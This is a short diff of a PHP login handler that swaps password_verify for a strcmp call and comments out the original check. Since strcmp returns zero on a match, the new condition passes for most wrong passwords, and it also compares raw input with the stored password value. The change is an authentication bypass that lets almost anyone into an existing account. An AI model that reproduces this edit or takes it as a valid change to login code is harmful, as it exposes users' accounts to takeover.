@@ -19,7 +19,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     $stmt->execute([$correo]);
     $usuario = $stmt->fetch();
 
-    if ($usuario && password_verify($contrasena, $usuario['contrasena'])) {
+    if ($usuario && strcmp($contrasena, $usuario['contrasena']) /*password_verify($contrasena, $usuario['contrasena'])*/) {
         $_SESSION['usuario_id'] = $usuario['id'];
         header("Location: perfil.php");
         exit();
